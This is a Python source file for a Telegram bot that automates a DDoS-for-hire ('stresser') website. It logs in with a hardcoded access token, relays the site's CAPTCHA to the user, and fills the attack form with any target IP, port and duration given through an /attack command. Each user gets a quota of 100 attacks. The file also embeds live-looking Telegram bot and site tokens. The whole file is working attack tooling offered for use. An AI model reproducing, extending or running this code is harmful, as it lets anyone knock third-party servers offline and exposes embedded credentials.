import os
import json
import logging
import threading
import time
import asyncio
import glob
from datetime import datetime
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, ContextTypes, MessageHandler, filters, CallbackQueryHandler, ConversationHandler
from playwright.async_api import async_playwright

# ==================== CONFIG ====================
logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
logger = logging.getLogger(__name__)

BOT_TOKEN = "8521144614:AAH0d-UUxRQESHVStJD3dbsb956vf4q77h8"
WEBSITE_URL = "https://satellitestress.st/attack"
LOGIN_URL = "https://satellitestress.st/login"
WEBSITE_TOKEN = "622de40ac2335a06b834fad06a24c42dcfdc7423b93d35a5add017c08c10db37"

# Conversation states
CAPTCHA_WAIT = 1

# ==================== ATTACK TRACKING ====================
attack_file = "attacks.json"

def load_attacks():
    try:
        with open(attack_file, 'r') as f:
            return json.load(f)
    except:
        return {"current": None, "user_counts": {}}

def save_attacks(data):
    with open(attack_file, 'w') as f:
        json.dump(data, f, indent=2)

attacks = load_attacks()

# ==================== PLAYWRIGHT SETUP ====================
def get_playwright_chromium_path():
    """Find Playwright's installed Chromium path"""
    cache_dir = os.path.expanduser("~/.cache/ms-playwright")
    chromium_folders = glob.glob(f"{cache_dir}/chromium-*")
    
    if chromium_folders:
        linux_path = os.path.join(chromium_folders[0], "chrome-linux", "chrome")
        if os.path.exists(linux_path):
            return linux_path
    return None

# ==================== PLAYWRIGHT ATTACK FUNCTION WITH CAPTCHA ====================
async def launch_attack_playwright(ip, port, duration, update, context):
    try:
        async with async_playwright() as p:
            # Get Chromium path
            chromium_path = get_playwright_chromium_path()
            
            # Launch browser
            if chromium_path:
                browser = await p.chromium.launch(
                    executablePath=chromium_path,
                    headless=True
                )
            else:
                browser = await p.chromium.launch(headless=True)
            
            context_obj = await browser.new_context(viewport={'width': 1280, 'height': 720})
            page = await context_obj.new_page()
            
            # ========== LOGIN SECTION ==========
            print("🔑 Logging in...")
            await page.goto(LOGIN_URL, wait_until='networkidle')
            await page.wait_for_timeout(3000)
            
            # Find token field
            token_field = await page.query_selector('input[type="text"]')
            if not token_field:
                await browser.close()
                return False, "❌ Token field not found"
            
            await token_field.fill(WEBSITE_TOKEN)
            print("✅ Token entered")
            
            # ========== CHECK FOR CAPTCHA ==========
            captcha_input = await page.query_selector('input[name="captcha"]')
            captcha_img = await page.query_selector('img[alt*="captcha"], img[src*="captcha"]')
            
            if captcha_input and captcha_img:
                # CAPTCHA detected! Send to user
                await context.bot.send_message(
                    chat_id=update.effective_chat.id,
                    text="🔐 **CAPTCHA DETECTED!** Solving..."
                )
                
                # Take screenshot of CAPTCHA
                await captcha_img.screenshot(path='captcha.png')
                
                # Send to Telegram for manual solving
                await context.bot.send_photo(
                    chat_id=update.effective_chat.id,
                    photo=open('captcha.png', 'rb'),
                    caption="🔑 **Please enter the CAPTCHA text:**"
                )
                
                # Store browser/page for later use
                context.user_data['awaiting_captcha'] = True
                context.user_data['captcha_page'] = page
                context.user_data['browser'] = browser
                context.user_data['attack_params'] = (ip, port, duration)
                
                return False, "CAPTCHA_REQUIRED"
            
            # ========== NO CAPTCHA - CONTINUE LOGIN ==========
            login_btn = await page.query_selector('button.bg-yellow-600')
            if login_btn:
                await login_btn.click()
                print("✅ Login button clicked")
                await page.wait_for_timeout(5000)
            else:
                await browser.close()
                return False, "❌ Login button not found"
            
            # ========== ATTACK PAGE ==========
            print("🎯 Navigating to attack page...")
            await page.goto(WEBSITE_URL, wait_until='networkidle')
            await page.wait_for_timeout(3000)
            
            # ========== FILL ATTACK FORM ==========
            inputs = await page.query_selector_all('input[type="text"]')
            print(f"🔍 Found {len(inputs)} input fields")
            
            if len(inputs) >= 3:
                await inputs[0].fill(ip)
                await inputs[1].fill(str(port))
                await inputs[2].fill(str(duration))
                print("✅ Attack form filled")
            else:
                await browser.close()
                return False, f"❌ Only {len(inputs)} inputs found"
            
            # ========== CLICK LAUNCH BUTTON ==========
            launch_btn = await page.query_selector('button:has-text("Launch")')
            if not launch_btn:
                # Try alternative button selectors
                buttons = await page.query_selector_all('button')
                if buttons:
                    launch_btn = buttons[-1]
            
            if launch_btn:
                await launch_btn.click()
                print("✅ Launch button clicked")
                
                # Wait for attack to register
                await page.wait_for_timeout(3000)
                
                # Check if attack started
                page_content = await page.content()
                if "attack started" in page_content.lower() or "launching" in page_content.lower():
                    status = "ATTACK SENDING SOON"
                else:
                    status = "ATTACK LAUNCHED"
                
                await browser.close()
                return True, status
            else:
                await browser.close()
                return False, "❌ Launch button not found"
            
    except Exception as e:
        return False, str(e)

# ==================== HANDLE CAPTCHA RESPONSE ====================
async def handle_captcha_response(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle user's CAPTCHA answer"""
    user_input = update.message.text.strip()
    
    if context.user_data.get('awaiting_captcha'):
        await update.message.reply_text("🔄 **Processing CAPTCHA...**")
        
        # Get stored page and browser
        page = context.user_data.get('captcha_page')
        browser = context.user_data.get('browser')
        ip, port, duration = context.user_data.get('attack_params', (None, None, None))
        
        if page and browser:
            try:
                # Fill CAPTCHA
                captcha_input = await page.query_selector('input[name="captcha"]')
                if captcha_input:
                    await captcha_input.fill(user_input)
                    
                    # Click login
                    login_btn = await page.query_selector('button.bg-yellow-600')
                    if login_btn:
                        await login_btn.click()
                        print("✅ Login button clicked after CAPTCHA")
                        await page.wait_for_timeout(5000)
                    
                    # Go to attack page
                    await page.goto(WEBSITE_URL, wait_until='networkidle')
                    await page.wait_for_timeout(3000)
                    
                    # Fill attack form
                    inputs = await page.query_selector_all('input[type="text"]')
                    if len(inputs) >= 3:
                        await inputs[0].fill(ip)
                        await inputs[1].fill(str(port))
                        await inputs[2].fill(str(duration))
                        
                        # Click launch
                        launch_btn = await page.query_selector('button:has-text("Launch")')
                        if launch_btn:
                            await launch_btn.click()
                            await page.wait_for_timeout(3000)
                            
                            # Check attack status
                            page_content = await page.content()
                            if "attack started" in page_content.lower() or "launching" in page_content.lower():
                                status = "✅ **ATTACK SENDING SOON**"
                            else:
                                status = "✅ **ATTACK LAUNCHED SUCCESSFULLY**"
                            
                            await update.message.reply_text(status)
                            
                            # Update attack count
                            user_id = update.effective_user.id
                            counts = attacks.get("user_counts", {})
                            user_key = str(user_id)
                            counts[user_key] = counts.get(user_key, 0) + 1
                            attacks["user_counts"] = counts
                            save_attacks(attacks)
                            
                            remaining = 100 - counts.get(user_key, 0)
                            await update.message.reply_text(f"🎯 Attacks remaining: {remaining}/100")
                        else:
                            await update.message.reply_text("❌ Launch button not found")
                    else:
                        await update.message.reply_text(f"❌ Only {len(inputs)} inputs found")
                else:
                    await update.message.reply_text("❌ CAPTCHA input field not found")
                    
            except Exception as e:
                await update.message.reply_text(f"❌ Error: {str(e)}")
            finally:
                await browser.close()
                context.user_data.clear()
        else:
            await update.message.reply_text("❌ Session expired. Start again with /attack")
            context.user_data.clear()
        
        return ConversationHandler.END
    
    return

# ==================== COMMAND HANDLERS ====================
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Start command"""
    await update.message.reply_text(
        "🤖 **ATTACK BOT**\n\n"
        "Commands:\n"
        "• `/attack <ip> <port> <time>` - Launch attack\n"
        "  Example: `/attack 1.1.1.1 80 60`\n\n"
        "• `/status` - Check attack status\n"
        "• `/stats` - Your attack stats\n"
        "• `/help` - Show help"
    )

async def attack_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /attack command"""
    user_id = update.effective_user.id
    
    # Check if attack already running
    if attacks.get("current") is not None:
        await update.message.reply_text("⚠️ Another attack is already running. Please wait.")
        return
    
    # Parse arguments
    args = context.args
    if len(args) != 3:
        await update.message.reply_text(
            "❌ **Invalid format!**\n"
            "Use: `/attack <ip> <port> <time>`\n"
            "Example: `/attack 1.1.1.1 80 60`"
        )
        return
    
    ip, port_str, time_str = args
    
    # Validate port
    try:
        port = int(port_str)
        if port < 1 or port > 65535:
            await update.message.reply_text("❌ Port must be between 1-65535")
            return
    except:
        await update.message.reply_text("❌ Invalid port number")
        return
    
    # Validate time
    try:
        duration = int(time_str)
        if duration < 10 or duration > 300:
            await update.message.reply_text("❌ Time must be between 10-300 seconds")
            return
    except:
        await update.message.reply_text("❌ Invalid time")
        return
    
    # Store attack info
    attacks["current"] = {
        "ip": ip,
        "port": port,
        "duration": duration,
        "user_id": user_id,
        "start_time": time.time()
    }
    save_attacks(attacks)
    
    await update.message.reply_text(
        f"🔄 **LAUNCHING ATTACK...**\n\n"
        f"Target: `{ip}:{port}`\n"
        f"Duration: {duration}s"
    )
    
    # Run attack in thread
    loop = asyncio.get_event_loop()
    
    def attack_thread():
        try:
            # Create new event loop for thread
            new_loop = asyncio.new_event_loop()
            asyncio.set_event_loop(new_loop)
            
            # Run attack
            success, result = new_loop.run_until_complete(
                launch_attack_playwright(ip, port, duration, update, context)
            )
            
            if result == "CAPTCHA_REQUIRED":
                # CAPTCHA handling is done separately
                return
            
            # Update attack counts
            attacks["current"] = None
            if success:
                counts = attacks.get("user_counts", {})
                user_key = str(user_id)
                counts[user_key] = counts.get(user_key, 0) + 1
                attacks["user_counts"] = counts
                save_attacks(attacks)
            
            remaining = 100 - attacks.get("user_counts", {}).get(str(user_id), 0)
            
            # Send result
            async def send_result():
                if success:
                    if result == "ATTACK LAUNCHED":
                        status_msg = "✅ **ATTACK LAUNCHED SUCCESSFULLY!**"
                    else:
                        status_msg = "✅ **ATTACK SENDING SOON!**"
                    
                    await context.bot.send_message(
                        chat_id=update.effective_chat.id,
                        text=f"{status_msg}\n\n"
                             f"Target: `{ip}:{port}`\n"
                             f"Duration: {duration}s\n"
                             f"Attacks Left: {remaining}/100"
                    )
                else:
                    await context.bot.send_message(
                        chat_id=update.effective_chat.id,
                        text=f"❌ **ATTACK FAILED**\n\n{result}"
                    )
            
            asyncio.run_coroutine_threadsafe(send_result(), loop)
            
        except Exception as e:
            attacks["current"] = None
            save_attacks(attacks)
            
            async def send_error():
                await context.bot.send_message(
                    chat_id=update.effective_chat.id,
                    text=f"❌ **ERROR**\n\n{str(e)}"
                )
            
            asyncio.run_coroutine_threadsafe(send_error(), loop)
    
    thread = threading.Thread(target=attack_thread)
    thread.daemon = True
    thread.start()

async def status_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Check attack status"""
    if attacks.get("current"):
        attack = attacks["current"]
        elapsed = int(time.time() - attack.get("start_time", time.time()))
        remaining = max(0, attack["duration"] - elapsed)
        
        await update.message.reply_text(
            f"🔥 **ATTACK IN PROGRESS**\n\n"
            f"Target: `{attack['ip']}:{attack['port']}`\n"
            f"Elapsed: {elapsed}s\n"
            f"Remaining: {remaining}s"
        )
    else:
        await update.message.reply_text("✅ No active attacks. Ready to launch!")

async def stats_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Show user stats"""
    user_id = update.effective_user.id
    user_key = str(user_id)
    
    used = attacks.get("user_counts", {}).get(user_key, 0)
    remaining = 100 - used
    
    await update.message.reply_text(
        f"📊 **YOUR STATS**\n\n"
        f"✅ Attacks Used: {used}\n"
        f"🎯 Attacks Left: {remaining}/100\n"
        f"🆔 User ID: `{user_id}`"
    )

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Show help"""
    await update.message.reply_text(
        "🆘 **HELP**\n\n"
        "**Commands:**\n"
        "• `/attack <ip> <port> <time>` - Launch attack\n"
        "  Example: `/attack 1.1.1.1 80 60`\n"
        "• `/status` - Check current attack\n"
        "• `/stats` - Your attack usage\n"
        "• `/help` - Show this message\n\n"
        "**Time range:** 10-300 seconds\n"
        "**Port range:** 1-65535\n\n"
        "If CAPTCHA appears, enter it when prompted."
    )

# ==================== MAIN ====================
def main():
    app = Application.builder().token(BOT_TOKEN).build()
    
    # Command handlers
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("attack", attack_command))
    app.add_handler(CommandHandler("status", status_command))
    app.add_handler(CommandHandler("stats", stats_command))
    app.add_handler(CommandHandler("help", help_command))
    
    # CAPTCHA response handler
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_captcha_response))
    
    print("="*50)
    print("🔥 COMMAND-BASED ATTACK BOT STARTED")
    print("="*50)
    print("Commands:")
    print("  /attack <ip> <port> <time>")
    print("  /status")
    print("  /stats")
    print("  /help")
    print("="*50)
    print("👤 Everyone gets 100 attacks")
    print("🔐 Manual CAPTCHA handling enabled")
    print("="*50)
    
    app.run_polling()

if __name__ == "__main__":
    main()
